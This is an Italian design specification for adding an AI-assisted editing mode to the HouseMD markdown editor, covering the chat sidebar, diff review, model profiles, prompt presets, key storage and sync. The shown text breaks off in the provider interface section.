# HouseMD — AI Tool (design)

Data: 2026-09-27
Base: HouseMD v1.1 (branch `feat/housemd-v1.1`, spec `2026-09-27-housemd-v1-1-design.md`). Questa spec presuppone
v1.1 completata e unita a `main`: coda `runExclusive`, `generation`, cronologia locale con `restoreVersion`,
impostazioni, DB IndexedDB v2, flusso di aggiornamento PWA.
Riferimenti: `MakhBeth/tg-digest` (selezione dei modelli, bridge Claude Code) e la sync su file di Pivella
(`pivella-sync.json`, `~/Projects/pivella/docs/fattibilita-mcp.md` §13.2–13.3).
Stato: **rivista dopo le risposte di Davide** (§1), da approvare.

## Obiettivo

Una seconda "modalità" di HouseMD per lavorare sul documento aperto insieme a un modello linguistico:

- la sidebar sinistra si commuta tra **File** (quella di oggi) e **AI** (chat con l'agente);
- con la sidebar AI attiva, l'area principale diventa una **vista di revisione**: a sinistra il markdown originale,
  a destra la proposta dell'AI, con diff e scroll sincronizzato quando ha senso;
- un **selettore di modello** sul modello di tg-digest, ma con più configurazioni salvate: Ollama, LM Studio,
  endpoint compatibili OpenAI, API Anthropic e **abbonamento Claude Code tramite bridge locale**, con parametri
  modificabili al volo;
- **preset di prompt** salvati come impostazioni nel database: "Sbobina transcript", "Traduci in inglese",
  "Controlla consecutio temporum", più quelli dell'utente; sync opzionale tramite un JSON esterno sul modello di
  `pivella-sync.json`.

Criterio di successo: aprire una trascrizione grezza, scegliere il preset "Sbobina", vedere la proposta arrivare a
destra, accettare tutto o solo alcuni blocchi, e ritrovare il risultato salvato su disco con le stesse garanzie di
autosave, cronologia e annullamento di una modifica fatta a mano. Lo stesso con Ollama, con l'API Anthropic e con
l'abbonamento Claude Code, cambiando profilo dal selettore senza toccare altro. Su un secondo computer, scegliendo
la stessa cartella di sync, gli stessi preset e profili (senza chiavi).

## 1. Decisioni

**Richiesta iniziale:**
- sidebar sinistra alternativa, in switch con quella attuale, con una chat verso l'AI;
- selettore di modello con più configurazioni salvabili, parametri modificabili al volo, modelli locali e in
  abbonamento;
- vista con originale a sinistra, proposta a destra, scroll sincronizzato "se sensato";
- tre preset: sbobina transcript, traduci in inglese, controlla consecutio temporum.

**Risposte di Davide (27/9/2026), chiuse:**
- **D1. Il gateway per l'abbonamento serve già nella v1.** Si copia il pattern di tg-digest: provider
  `claude-code` che parla con un bridge locale (`bridge/claude-bridge.mjs`) che espone la CLI `claude` come
  endpoint compatibile OpenAI. Stesso schema di selezione dei modelli (§4.4).
- **D2. Nessuna memoria delle chat per file.** Le chat sono generiche e vengono correlate al file su cui si lavora
  al momento dell'invio (§4.3). Niente persistenza delle chat.
- **D3. I preset si salvano come impostazioni nel database** (IndexedDB), con **sync opzionale** su un JSON
  esterno in una cartella scelta dall'utente, sul modello di `pivella-sync.json` (§8).

**Assunzioni rimaste (da confermare in review):**
1. **Nessun server HouseMD.** Le chiamate partono dal browser; il bridge Claude Code è un programma locale che
   l'utente avvia, come Ollama.
2. **La colonna sinistra della revisione è il documento vivo, modificabile.** Accettare la proposta è una modifica
   dell'editor (annullabile con `Ctrl+Z`), che poi segue autosave e cronologia come qualsiasi battitura.
3. **La proposta a destra è modificabile a mano** prima di accettarla.
4. **"Chat agente" in questa versione = chat che produce proposte sul documento aperto.** Nessuno strumento che
   scrive file o legge altri file.
5. **Il file di sync contiene preset e profili, mai le chiavi API.** Sincronizzare anche i profili (URL, modello,
   parametri) evita di riconfigurarli su ogni computer; se non serve, si toglie lo store `profiles` dal file senza
   altre conseguenze.
6. **I preset predefiniti sono record normali** del database, creati al primo avvio e modificabili, con
   "Ripristina originale".

## Vincoli (invariati da v1.1)

- Solo Chromium desktop recente; Popover, Anchor Positioning, `<dialog closedby>` senza polyfill.
- Mai `innerHTML`/`dangerouslySetInnerHTML` con HTML non sanitizzato: le risposte dell'AI in chat passano da
  `render.ts` + `sanitize.ts` come l'anteprima. Mai `alert/confirm/prompt`.
- Solo `src/fs/fsaOps.ts` e `src/fs/access.ts` toccano la File System Access API: anche la cartella di sync passa
  da `fsaOps(handle)` e dall'interfaccia `FsOps`.
- Logica in moduli puri testati con `tsx --test`; componenti React sottili.
- Tutti i testi UI da `t()`, chiavi nuove in tutti i `locales/*.json`.
- Operazioni del `Workspace` sui file dalla coda `runExclusive`; nessun `await` della cronologia nei percorsi che
  cambiano il documento.

**Regole nuove per `CLAUDE.md`** (da aggiungere nella fase 3, non ora):
- Solo `src/ai/providers/*` fanno richieste di rete verso i modelli.
- Le chiavi API stanno solo nello store `aiSecrets`: mai in `localStorage`, mai in `.housemd.json`, mai nel file di
  sync, mai nei log o nei toast.
- Il file di sync si scrive solo con backup verificato prima (§8.4).

## Fuori scope (lista "dopo")

- Strumenti dell'agente (leggere altri file, cercare nel workspace, seguire wikilink), in sola lettura.
- Memoria delle chat tra una sessione e l'altra (D2).
- Streaming dal bridge Claude Code (v1 risponde a messaggio intero, come in tg-digest; §6.5).
- Proposte su più file insieme; creazione di file nuovi dall'AI.
- Stima dei costi in denaro; conteggio token esatto (si usa una stima caratteri/4 e l'`usage` restituito).
- Autocompletamento inline nell'editor ("ghost text"). Speech-to-text.
- Rilevamento automatico degli URL dietro reverse proxy (in tg-digest si attiva quando l'origine non è
  `localhost`; su HouseMD pubblicato su Netlify darebbe URL sbagliati). Il proxy resta possibile scrivendo l'URL
  nel profilo.

## 2. Dove si inserisce nell'architettura attuale

Punti di aggancio letti nel codice (v1.1):

| Area | Oggi | Cosa cambia |
|---|---|---|
| `ui/WorkspaceView.tsx` | Grid `sidebar | resizer | main`; `mode` = `editor/split/preview`; `historyOpen` sovrappone `HistoryPanel` al riquadro destro | Nuovo stato `sidebarView: 'files' \| 'ai'`. Con `ai` la sidebar mostra `AiSidebar` e `main` mostra `ReviewView` al posto di `panes`. Il `mode` resta salvato e torna uguale quando si rientra in `files`. |
| `ui/SettingsDialog.tsx` | Lingua, tema, autosave | Nuova sezione **AI**: profili, preset, sincronizzazione (§4.4, §5.3, §8). |
| `editor/Editor.tsx` | Crea l'`EditorView` con le estensioni (markdown, wikilink, immagini, `updateListener → onChange`), gestisce `resetKey` e il comando `restore` | Le estensioni del documento si estraggono in `editor/docExtensions.ts` e la logica `resetKey`/`restore` in `editor/useDocBinding.ts`; testo, selezione e cronologia di annullamento vivono in un `DocSession` che sopravvive ai cambi di vista (§9). |
| `workspace/workspace.ts` | `edit(textLf)`, `snapshot(path, text, reason)` privato, `generation`, `state.updating`, `doc.conflict` | Un solo metodo pubblico nuovo: `snapshotBeforeAi()` → snapshot `before-ai` fire-and-forget del testo corrente. Il testo accettato arriva al `Workspace` tramite `edit()` dall'editor sinistro: nessuna nuova via di scrittura su disco. |
| `history/` | `SnapshotReason` = `save \| before-reload \| before-overwrite \| before-restore` | Si aggiunge `before-ai` (con traduzione del motivo nel pannello cronologia). |
| `history/diffRows.ts` + dipendenza `diff` | Diff a righe per la cronologia | Riusato dai controlli della proposta (§7.5); il diff visuale usa `@codemirror/merge`. |
| `preview/scrollSync.ts` | `offsetForLine`/`lineForOffset` con ancore interpolate | Riusato per lo scroll allineato della vista affiancata (§4.5). |
| `preview/Preview.tsx` | Anteprima con `onTopLine`/`scrollToLine` | Riusata come vista "Anteprima" del lato destro. |
| `fs/fsaOps.ts`, `fs/ops.ts`, `fs/testing/memoryOps.ts` | `FsOps` su una cartella (workspace), `moveFile` opzionale | Riusati tali e quali sulla cartella di sync (§8). |
| `fs/access.ts` | Scelta cartella e permessi (`pickFolder`, `hasAccess`, `requestAccess`) | Riusato per scegliere la cartella di sync e riattivarne il permesso; l'handle si salva in `aiSyncMeta` (§5.6), non tra le cartelle di lavoro di `handleStore`. |
| `lib/db.ts` | DB v2: `workspace`, `buffers`, `history`; gestione `onblocked`/`onversionchange` | DB v3 con gli store AI (§5.4), stesso upgrade incrementale. |
| `lib/prefs.ts` | Preferenze in `localStorage` ("mai dati importanti") | Solo preferenze UI dell'AI (vista attiva, larghezza sidebar AI, scroll collegato, profilo attivo). |
| `ui/shortcuts.ts` | Scorciatoie centralizzate | Scorciatoia per commutare la sidebar (§4.1). |

Lo stato AI segue lo schema del `Workspace`: una classe `AiController` con `getState`/`subscribe` letta da React con
`useSyncExternalStore`, dipendenze iniettate (provider, store, orologio) e logica in moduli puri sotto `src/ai/`.
Lo stesso per la sync (`AiSync`, §8).

## 3. Approcci considerati

**A. Vista di revisione legata alla sidebar AI, diff con `@codemirror/merge` (scelto).**
La sidebar AI e la vista di revisione sono un'unica modalità. Il diff usa `MergeView` di `@codemirror/merge`
(pacchetto ufficiale CodeMirror): due editor allineati con spaziatori in un unico contenitore di scroll,
evidenziazione delle modifiche, controlli per accettare il singolo blocco, comandi "blocco successivo/precedente",
opzione "nascondi le parti invariate". Scroll sincronizzato per costruzione nella vista diff. Costo: una
dipendenza nuova e l'estrazione delle estensioni dell'editor.

**B. Pannello sovrapposto come la cronologia, sidebar invariata.** Meno codice, ma contraddice la richiesta
(sidebar in switch) e lascia poco spazio alla chat.

**C. Diff fatto in casa con la libreria `diff` su due CodeMirror separati.** Nessuna dipendenza nuova, ma
allineamento, spaziatori, scroll e accettazione per blocco andrebbero riscritti: è ciò che `@codemirror/merge` fa
già.

Per i provider: **chiamate dirette dal browser**, più il bridge locale per l'abbonamento Claude Code (D1).

## 4. Esperienza utente

### 4.1 Commutare la sidebar

- In testa alla sidebar, un gruppo di due pulsanti con icona (`aria-pressed`): **File** / **AI**. Il pulsante "AI"
  compare anche nella toolbar, così si entra nella modalità a sidebar chiusa (la apre).
- Scorciatoia in `shortcuts.ts`: candidata `Ctrl/Cmd+Shift+E` (da verificare in fase 3 che Chrome non la usi;
  evitare `Ctrl+Shift+A`, che in Chrome è la ricerca schede). `Ctrl+K` (cerca) torna sempre alla sidebar File.
- La sidebar AI ha una larghezza propria (`aiSidebarWidth`, default 380, range 300–640).
- Uscendo dalla modalità AI si torna al `mode` precedente (editor/affiancato/anteprima). Chat e proposte restano.

### 4.2 Layout della modalità AI

```
┌ sidebar AI ───────────────┐┌ toolbar (percorso · stato salvataggio · tema · impostazioni) ─────────────┐
│ [File] [AI]               ││ barra proposta: ● In arrivo… 1.240 parole · [Diff|Affiancata] · ⚠ 2 avvisi │
│ ┌ Modello ──────────────┐ ││                 ↑↓ blocchi · [Scarta] · [Accetta tutto]                    │
│ │ Claude Code · opus ▾ ⚙│ │├─────────────────────────────────┬──────────────────────────────────────────┤
│ └───────────────────────┘ ││ ORIGINALE (documento vivo)      │ PROPOSTA AI            [Sorgente|Anteprima]│
│ [Sbobina] [Traduci]       ││                                 │                                          │
│ [Consecutio] [⋯]          ││ …testo…                  ←──────│ …testo modificato…                       │
│ ───────────────────────── ││ - riga tolta                    │ + riga aggiunta                          │
│ 📄 lezione-3.md           ││                                 │                                          │
│ Tu: sbobina questo        ││                                 │                                          │
│ AI: fatto, 3 parti ✓      ││                                 │                                          │
│   ⚠ 1 link cambiato       ││                                 │                                          │
│ ── ora su: note.md ────── ││                                 │                                          │
│ [ scrivi una richiesta… ] ││                                 │                                          │
│ [Nuova chat]  [■ Stop|➤]  ││                                 │                                          │
└───────────────────────────┘└─────────────────────────────────┴──────────────────────────────────────────┘
```

- Senza proposta per il file aperto: a sinistra l'editor, a destra un segnaposto ("Scegli un preset o scrivi una
  richiesta"). Le due colonne restano fisse per non far saltare il layout.
- `ConflictBar` e dialog di accesso perso restano quelli di oggi, sopra la vista.

### 4.3 Chat generica correlata al file (D2)

- **Una chat attiva, non legata a un file.** "Nuova chat" la svuota. La chat vive in memoria: si perde ricaricando
  la pagina o cambiando cartella.
- **Correlazione al file:** ogni messaggio dell'utente registra il file aperto al momento dell'invio
  (`docPath`) e porta al modello il testo di quel file. Nella chat, un'etichetta col nome del file compare sul primo
  messaggio e ogni volta che il file cambia ("ora su: note.md"); cliccandola si apre quel file.
- **Proposte per file:** la proposta appartiene al file su cui è stata generata (mappa in memoria
  `percorso → proposta`). Cambiando file la vista di revisione mostra la proposta di quel file, se c'è. Una
  richiesta in corso resta legata al suo file e continua in background.
- Nessuna persistenza delle proposte (coerente con D2). Le proposte "da proteggere" sono quelle in arrivo o non
  ancora applicate né scartate (`AiController.hasPendingWork()`). Due protezioni:
  - **chiusura o ricarica manuale:** l'handler `beforeunload` di `WorkspaceView` mostra l'avviso nativo anche quando
    `hasPendingWork()` è vero, come per le modifiche non salvate;
  - **aggiornamento PWA (v1.1, `pwa/updateHost.ts`):** oggi `prepare()` mette al sicuro solo il `Workspace`, e
    durante il reload protetto (`updateReady`) `beforeunload` non avvisa. L'host diventa una lista di partecipanti
    (`registerUpdateParticipant({ prepare, cancel })`): il `Workspace` e l'`AiController`. `AiController.prepare()`
    risponde `failed` se `hasPendingWork()`, con il toast `aiPendingUpdate` ("Accetta o scarta la proposta AI, o
    ferma la richiesta, prima di aggiornare"); `prepare()` complessivo è `durable` solo se lo sono tutti, e in caso
    contrario chiama `cancel()` su chi aveva già preparato. Vale anche per il reload avviato da un'altra scheda
    (`onNeedReload`): quella scheda resta sulla versione vecchia finché l'utente non libera le proposte e riprova
    l'aggiornamento. Mentre `updating` è attivo non si possono avviare nuove richieste AI.
- Messaggi utente e assistente; l'assistente è markdown renderizzato con la pipeline di rendering dedicata all'AI
  (§7.6: niente HTML grezzo, risorse remote bloccate), aggiornato durante lo streaming al massimo una volta per
  frame.
- Sotto ogni risposta: profilo e modello usati, token in/out se il provider li restituisce, avvisi dei controlli
  (§7.5), stato (`in corso`, `interrotta`, `errore` con testo tradotto e suggerimento).
- Mentre il modello "ragiona" senza emettere testo, o mentre il bridge Claude Code lavora (niente streaming):
  indicatore "Sta lavorando…" con il tempo trascorso.
- Invio con `Ctrl/Cmd+Enter`; `Esc` o "Stop" interrompe (AbortController). Una richiesta alla volta.
- Ambito sotto il campo di testo: **Documento** (default) o **Selezione** (fase 7: se nell'editor sinistro c'è una
  selezione, la richiesta riguarda solo quel tratto e la proposta sostituisce solo quello; regole in §5.5).

### 4.4 Selettore di modello (pattern tg-digest, con profili)

In tg-digest le impostazioni hanno un solo provider con i suoi campi; qui ogni **profilo** è una configurazione
completa di quel tipo, e se ne salvano quanti se ne vogliono.

**Nella sidebar:**
- `<select>` dei profili salvati, raggruppati in `<optgroup>` **Locali** (Ollama, LM Studio, Claude Code,
  endpoint su `localhost`) / **Cloud** (Anthropic, endpoint remoti). Etichetta: nome del profilo e modello
  ("Claude Code · opus", "Qwen precisa · qwen3.6:35b-mlx").
- Pulsante ⚙ che apre un **popover** (Popover API + Anchor Positioning) con il **modello** e i parametri *per
  questa sessione*. Il campo modello è la stessa select di tg-digest (sotto). Mostra solo i parametri che quel
  provider accetta (§6.3).
- Una modifica nel popover è un **override di sessione**: pallino "modificato" sul selettore e tre azioni:
  **Salva nel profilo**, **Salva come nuovo profilo…**, **Ripristina**.
- Ultima voce del select: "Gestisci modelli…" → apre le Impostazioni sulla sezione AI.
- Profilo attivo ricordato in prefs (`aiProfile`).

**Select del modello, come in tg-digest:**

| Provider | Elenco | Default |
|---|---|---|
| `ollama` | letto dal server: `GET {url}/api/tags`; se non risponde, elenco statico di ripiego | `qwen3.6:35b-mlx` |
| `lmstudio` | `GET {url}/api/v0/models` (tutti i modelli scaricati, esclusi gli embedding), ripiego su `/v1/models` se 404; nessun elenco statico | nessuno: "— seleziona un modello —" |
| `openai-compatible` | `GET {url}/models` | nessuno |
| `anthropic` | elenco statico degli ID attuali (`claude-opus-5`, `claude-sonnet-5`, `claude-haiku-4-5`, `claude-fable-5-1`, …); "Aggiorna elenco" facoltativo da `GET /v1/models` | `claude-opus-5` |
| `claude-code` | "Default della CLI" (valore vuoto), alias `opus` / `sonnet` / `haiku`, più gli ID Anthropic | Default della CLI |

- Ultima opzione sempre **"Altro…"**: campo di testo libero per un nome qualsiasi.
- Un modello salvato che non è nell'elenco corrente resta visibile come "nome (personalizzato)", non sparisce.
- Cambiando provider in un profilo, il modello resta solo se è valido per il nuovo provider, altrimenti si passa al
  default di quel provider.
- Gli elenchi letti dai server si caricano all'apertura del popover o del profilo, con l'URL corrente; un errore
  lascia il ripiego e mostra il motivo (§9).

**Nelle Impostazioni, sezione AI → Profili** (sostituisce il `ProfileDialog` della prima bozza):
- elenco profili: crea, duplica, rinomina, elimina;
- per profilo: nome, provider, URL (default: Ollama `http://localhost:11434`, LM Studio `http://localhost:1234`,
  bridge Claude Code `http://localhost:11436`, Anthropic fisso), chiave API (solo `anthropic` e
  `openai-compatible`; "ricorda in questo browser" sì/no), modello, parametri;
- "Prova connessione": una richiesta minima con esito e suggerimento tradotti (CORS, server spento, bridge non
  avviato, chiave errata…);
- per `ollama`/`lmstudio`/`claude-code` le istruzioni di avvio accanto al campo URL (`OLLAMA_ORIGINS`, "Enable
  CORS", `npm run bridge`).

### 4.5 Diff a due pannelli e scroll

Due viste della proposta, commutabili nella barra proposta; ogni preset sceglie la sua di default.

**Diff** (default per "Consecutio" e per le richieste libere):
- `MergeView`: `a` = documento vivo (estensioni di `docExtensions`, modificabile), `b` = proposta (modificabile,
  senza wikilink/immagini). Evidenziazione delle modifiche all'interno della riga.
- Ogni blocco cambiato ha nel margine un controllo "← accetta questo blocco" (`revertControls: 'b-to-a'`). È una
  transazione CodeMirror su `a`: annullabile, passa da `onChange → workspace.edit`.
- `↑`/`↓` nella barra saltano al blocco precedente/successivo; opzione "Nascondi parti invariate"
  (`collapseUnchanged`).
- **Scroll:** unico contenitore con spaziatori di allineamento → sincronizzato per costruzione, nessun JS.

**Affiancata** (default per "Traduci" e "Sbobina", dove quasi ogni riga cambia e un diff è rumore):
- Due pannelli indipendenti: a sinistra l'editor, a destra la proposta come sorgente (CodeMirror) o come
  **Anteprima** renderizzata (`Preview`).
- **Scroll collegato quando ha senso**, con modulo puro `ai/align.ts`:
  1. si estraggono i blocchi di primo livello di entrambi i testi (titoli, paragrafi, liste, blocchi di codice) con
     la riga di inizio, con lo stesso `map` di markdown-it già usato per le ancore dell'anteprima;
  2. se il numero di blocchi è compatibile (rapporto tra 0,8 e 1,25) si accoppiano per indice (tipico della
     traduzione, che conserva la struttura); altrimenti si accoppiano solo i **titoli** con lo stesso livello e
     ordine;
  3. se non si trovano almeno 3 coppie, ripiego **proporzionale** (stessa percentuale di scroll);
  4. le coppie `(rigaA, rigaB)` diventano ancore e la conversione usa l'interpolazione di `scrollSync.ts`, con la
     stessa soppressione dell'eco già usata tra editor e anteprima.
- Interruttore "Scorrimento collegato" nella barra (preferenza): per una sbobina molto ristrutturata anche il
  proporzionale può essere d'intralcio.

**Azioni sulla proposta:**
- **Accetta tutto**: una transazione su `a` che sostituisce l'intero testo (annullabile). Se il documento è cambiato
  dopo che la proposta è stata generata (`doc.text !== proposal.baseText`), prima un `ConfirmDialog`: "Il documento
  è cambiato dopo la proposta: accettando tutto perderai le modifiche fatte nel frattempo".
- **Scarta**: elimina la proposta del file (la chat resta).
- Al primo "accetta" (blocco o tutto) di ciascuna proposta: `workspace.snapshotBeforeAi()`, così in cronologia c'è
  sempre la versione di prima dell'AI, anche dopo che la cronologia di annullamento è andata persa.
- **Niente accettazione durante lo streaming.** Mentre una proposta è `streaming` (anche a parti) il diff si
  aggiorna ma tutti i controlli di accettazione sono disabilitati e l'editor `b` è di sola lettura: il suffisso non
  ancora arrivato apparirebbe come cancellazione, e un blocco del diff può mescolare testo arrivato e testo atteso o
  attraversare il confine tra due parti. Si accetta solo con la proposta `complete`, `partial` (dopo Stop o errore:
  le parti non elaborate sono testo originale identico, quindi nel diff non producono blocchi) o `truncated` (solo
  per blocco, mai "Accetta tutto", perché la coda manca). Per accettare subito ciò che è arrivato: Stop, poi accetta.
- **Ritocchi manuali e nuovi arrivi:** l'editor `b` diventa modificabile solo a proposta ferma. Un ritocco imposta
  `origin: 'edited'`. Una nuova richiesta sullo stesso file che produrrebbe una nuova proposta, con una proposta
  `edited` presente, parte da quella (è la `current-proposal` di §7.2); il testo in arrivo sostituisce la proposta
  solo alla fine della richiesta (fino ad allora si vede in un'anteprima di streaming separata dalla proposta
  ritoccata), così lo streaming non sovrascrive mai i ritocchi. Stop su quella richiesta lascia la proposta
  ritoccata com'era.
- Accettazione disabilitata (con tooltip) anche durante un conflitto e durante l'aggiornamento dell'app
  (`state.updating`).
- Quando la proposta coincide con il documento, la barra mostra "Proposta applicata" e offre di chiuderla.

## 5. Modello dati

Tipi in `src/ai/types.ts`; validazione con funzioni pure (valori sconosciuti → default, come `prefs`).

### 5.1 Campi comuni per la sync

Profili e preset sono record sincronizzabili (§8):

```ts
interface SyncRecord {
  id: string;
  updatedAt: number;   // epoch ms, timbrato a ogni modifica dell'utente (monotono, vedi sotto)
  updatedBy: string;   // writerId di questo browser (§8.2)
}
```

**Timbri monotoni** (`ai/sync/stamp.ts`, puro): `nextStamp(now, previous) = max(now, previous + 1)`, dove
`previous` è l'`updatedAt` della versione del record che si sta modificando (o il `deletedAt` del tombstone che si
sta sostituendo). Così una modifica locale supera sempre la versione da cui parte, anche se quella arriva da un
computer con l'orologio avanti; lo stesso per i tombstone (`deletedAt = max(now, updatedAt + 1)`).

### 5.2 Profili di modello

```ts
type ProviderKind = 'ollama' | 'lmstudio' | 'openai-compatible' | 'anthropic' | 'claude-code';

interface ModelProfile extends SyncRecord {
  name: string;
  kind: ProviderKind;
  baseUrl: string;            // ignorato per anthropic
  model: string;              // '' per claude-code = default della CLI
  secretId: string | null;    // riferimento in aiSecrets (solo anthropic / openai-compatible); mai sincronizzato
  params: GenParams;
  /** Finestra di contesto nota (da /models o scritta a mano), per dimensionare le parti. */
  contextTokens: number | null;
}

interface GenParams {
  temperature?: number;       // 0–2
  topP?: number;              // 0–1
  maxOutputTokens?: number;
  effort?: 'low' | 'medium' | 'high' | 'xhigh' | 'max';
  /** Caratteri per parte nell'elaborazione a pezzi (§7.4). */
  chunkChars?: number;
}

/** Override di sessione: stessi campi, più l'eventuale modello diverso. */
type ProfileOverrides = Partial<GenParams> & { model?: string };
```

`effectiveParams(profile, overrides, preset)` (puro): profilo ← parametri suggeriti dal preset ← override
dell'utente (vince l'utente), poi filtrato da `capabilities` (§6.3). Al primo avvio, se non ci sono profili, se ne
crea uno Ollama con i default di tg-digest.

### 5.3 Segreti

```ts
interface StoredSecret {
  id: string;
  value: string;
  /** Dove la chiave è autorizzata ad andare: fissato quando l'utente la inserisce. */
  binding: { kind: ProviderKind; origin: string };   // origin = scheme://host:port dell'endpoint
}
```

Store separato dai profili, escluso dalla sync e da qualsiasi esportazione. Le chiavi "non ricordate" vivono solo in
una `Map` in memoria dell'`AiController`, con lo stesso `binding`.

**Una chiave va solo all'endpoint per cui è stata inserita.** Prima di **ogni** richiesta autenticata (chat,
elenco modelli, "Prova connessione") `resolveSecret(profile, secret)` (puro) confronta `kind` e origine del
`baseUrl` corrente del profilo con il `binding`: se differiscono la chiave non viene usata, il profilo risulta
"chiave da confermare per <host>" e la richiesta non parte. L'utente conferma (la chiave si ri-lega al nuovo
endpoint) o ne inserisce un'altra. Vale per ogni cambio di URL o di provider, sia fatto a mano sia arrivato dalla
sync: un `baseUrl` cambiato su un altro computer non può far partire la chiave locale verso un host nuovo. Per
`anthropic` l'origine è fissa (`https://api.anthropic.com`).

Un profilo arrivato dalla sync su un altro computer ha `secretId` non risolto: il selettore lo segna "chiave
mancante" e la chiede al primo uso. Nota onesta (in UI e README): una chiave
salvata nel browser è leggibile da estensioni e da chi usa il profilo del browser; per i cloud si consiglia una
chiave dedicata con limite di spesa.

### 5.4 Preset come impostazioni (D3)

```ts
interface PromptPreset extends SyncRecord {
  /** Solo per i predefiniti: da quale originale deriva ("Ripristina originale"). */
  builtInId?: 'sbobina' | 'traduci' | 'consecutio';
  name: string;
  /** Istruzioni per il modello; possono contenere {targetLanguage}. */
  instructions: string;
  variables?: { targetLanguage?: string };
  view: 'diff' | 'side';
  strategy: 'whole' | 'chunked';
  /** keep = il frontmatter YAML non viene inviato e resta identico. */
  frontmatter: 'keep' | 'include';
  params?: Partial<GenParams>;
  /** Posizione nella barra dei preset; hidden = non mostrato nella sidebar. */
  order: number;
  hidden: boolean;
}
```

- **Predefiniti come record normali:** al primo avvio (store vuoto) si creano i tre predefiniti con id fissi
  (`builtin:sbobina`, `builtin:traduci`, `builtin:consecutio`), `updatedAt: 0`, `updatedBy: 'seed'` e
  **`name: ''`**: finché il nome è vuoto l'interfaccia mostra il nome tradotto (`t('ai.preset.<id>')`). Così il seme
  è identico byte per byte su tutti i browser, qualunque sia la lingua, e una qualsiasi modifica dell'utente (con
  timbro > 0) vince sempre sul seme nella fusione della sync. Se due versioni dell'app hanno semi diversi, lo
  spareggio finale di §8.2 sceglie in modo deterministico. "Ripristina originale" rimette istruzioni e opzioni del
  codice con un timbro nuovo. Un predefinito non si elimina: si nasconde.
- **Gestione nelle Impostazioni, sezione AI → Preset:** elenco ordinabile, crea, duplica, modifica (nome,
  istruzioni, lingua di destinazione, vista, strategia, frontmatter, parametri suggeriti), nascondi/mostra,
  elimina (solo quelli dell'utente). Dalla barra dei preset nella sidebar, il menu `⋯` porta qui.

Predefiniti (istruzioni in inglese, perché i modelli piccoli le seguono meglio; l'uscita resta nella lingua del
documento, tranne la traduzione):

| Preset | view | strategy | frontmatter | params | Istruzioni (bozza) |
|---|---|---|---|---|---|
| Sbobina transcript | side | chunked | keep | temperature 0.3 | "You receive a raw speech transcript (possibly automatic). Rewrite it as clean, readable Markdown in the same language: fix punctuation and capitalization, remove filler words, false starts and repetitions, split into paragraphs, add `##` headings where the topic changes. Keep speaker labels and timestamps if present. Do NOT summarize, do NOT omit content, do NOT add information. Output only the rewritten text." |
| Traduci in {lingua} | side | chunked | keep | temperature 0.2 | "Translate the Markdown document into {targetLanguage}. Preserve the Markdown structure exactly: headings, lists, tables, emphasis, line breaks between blocks. Do not translate: code blocks and inline code, URLs, image paths, the target of wikilinks `[[target]]` (translate only an alias after `|`), HTML tags. Output only the translation." |
| Controlla consecutio temporum | diff | chunked | keep | temperature 0 | "You are an Italian copy editor. Check the sequence of tenses and moods (consecutio temporum): concordance between main and subordinate clauses, subjunctive where required, conditional in hypothetical clauses. Change ONLY verbs (and the minimum required around them). Do not touch style, word choice, punctuation or anything else. If nothing needs fixing, return the text unchanged. Output only the text." |

`{targetLanguage}` del preset traduzione: default "English", modificabile nel preset.

### 5.5 Chat e proposte (solo in memoria, D2)

```ts
interface AiChat {
  id: string;
  messages: ChatMessage[];
  overrides: ProfileOverrides;   // override di sessione del selettore
}

interface ChatMessage {
  id: string;
  role: 'user' | 'assistant';
  text: string;               // per l'assistente: solo il commento, mai il testo della proposta
  docPath: string | null;     // file a cui si riferisce la richiesta (correlazione)
  presetId?: string;
  profileName?: string;
  model?: string;
  usage?: { inputTokens?: number; outputTokens?: number };
  status: 'streaming' | 'done' | 'aborted' | 'error';
  error?: AiErrorCode;
  warnings?: CheckWarning[];
}

interface Proposal {
  path: string;
  baseText: string;           // testo del documento su cui è stata generata (LF)
  text: string;               // testo proposto (LF), aggiornato in streaming
  origin: 'ai' | 'edited';    // edited = l'utente l'ha ritoccata a mano
  status: 'streaming' | 'complete' | 'partial' | 'truncated';
  progress?: { done: number; total: number };  // elaborazione a parti
  scope?: SelectionScope;     // ambito "Selezione" (fase 7)
  presetId?: string;
  snapshotTaken: boolean;     // before-ai già registrato per questa proposta
  createdAt: number;
}

/** Con ambito "Selezione", `text` è il solo tratto proposto, non il documento intero. */
interface SelectionScope {
  originalText: string;       // testo selezionato all'invio
  from: number;               // posizione all'invio, poi rimappata a ogni modifica del documento
  to: number;
  status: 'valid' | 'lost';
}
```

**Ambito "Selezione" e modifiche concorrenti.** Il documento resta modificabile durante e dopo la richiesta, quindi
gli offset non restano validi da soli:
- `from`/`to` si **rimappano** a ogni transazione dell'editor sinistro con la `ChangeSet` di CodeMirror
  (`mapPos`, `from` con associazione a destra, `to` a sinistra); l'editor notifica le modifiche all'`AiController`
  tramite `useDocBinding`. Una modifica **dentro** l'intervallo, o una ricarica del documento (`resetKey`), porta lo
  stato a `lost`.
- **Prima di accettare** si verifica sempre `doc.slice(from, to) === originalText`; se non torna, `lost`.
- Il documento intero mostrato a destra nel diff è calcolato al momento: documento corrente con `[from, to)`
  sostituito da `text`. Così le modifiche fuori dalla selezione restano e non vengono mai cancellate.
- Con `lost` l'accettazione è disabilitata e la barra dice "La selezione è cambiata: riseleziona e riprova"; la
  proposta si può ancora leggere e copiare.
- Test puri su `mapScope` e `applyScope` (inserimenti prima, dopo, dentro, a cavallo dei bordi; ricarica).

Stato dell'`AiController`: `chat: AiChat`, `proposals: Map<string, Proposal>`, `running: { messageId, path } | null`.
Cambiando cartella si azzera tutto.

### 5.6 Persistenza (IndexedDB v3)

- `DB_VERSION` 2 → 3 con upgrade incrementale (come v1.1): `aiProfiles` (keyPath `id`), `aiSecrets` (keyPath
  `id`), `aiPresets` (keyPath `id`), `aiSyncMeta` (chiave → valore: `writerId`, tombstone, handle della cartella,
  stato dell'ultima sync).
- Store con interfaccia e doppia implementazione (IndexedDB + memoria per i test), come `historyStore`.
- **Ogni modifica dell'utente timbra** `updatedAt` (con `nextStamp`, §5.1) e `updatedBy`; un'eliminazione scrive
  **prima** il tombstone con `deletedAt` strettamente maggiore dell'`updatedAt` del record, **poi** cancella (lezione di Pivella: un crash nel
  mezzo ritarda la cancellazione, non fa risorgere il record).
- Preferenze UI (in `prefs`): `sidebarView`, `aiSidebarWidth`, `aiView`, `aiRightPane`, `aiLinkedScroll`,
  `aiProfile`.

## 6. Provider AI

### 6.1 Interfaccia

```ts
interface ChatRequest {
  model: string;
  system: string;
  messages: Array<{ role: 'user' | 'assistant'; text: string }>;
  params: GenParams;          // già filtrati per capacità
}

type ChatEvent =
  | { type: 'text'; text: string }
  | { type: 'thinking' }                     // solo per mostrare "Sta lavorando…"
